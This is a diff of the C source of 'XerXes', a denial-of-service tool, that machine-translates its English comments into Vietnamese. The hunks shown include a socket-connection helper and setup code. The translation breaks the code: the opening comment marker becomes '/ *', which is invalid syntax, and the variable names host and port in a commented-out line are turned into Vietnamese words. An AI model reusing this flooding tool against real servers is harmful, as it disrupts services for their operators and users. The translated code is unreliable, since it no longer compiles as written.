@@ -1,4 +1,4 @@
-/* XerXes - Most powerful dos tool - THN (Xerxes-DDos by zanyarjamal) */
+/ * XerXes - Công cụ dos mạnh mẽ nhất - THN (Xerxes-DDos của zanyarjamal) * /
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -15,7 +15,7 @@
 int make_socket(char *host, char *port) {
 	struct addrinfo hints, *servinfo, *p;
 	int sock, r;
-//	fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
+//	fprintf(stderr, "[Đang kết nối -> %s:%s\n", tổ chức, cổng);
 	memset(&hints, 0, sizeof(hints));
 	hints.ai_family = AF_UNSPEC;
 	hints.ai_socktype = SOCK_STREAM;
@@ -46,7 +46,7 @@ int make_socket(char *host, char *port) {
 }
 
 void broke(int s) {
-	// do nothing
+	// không làm gì cả
 }
 
 #define CONNECTIONS 8
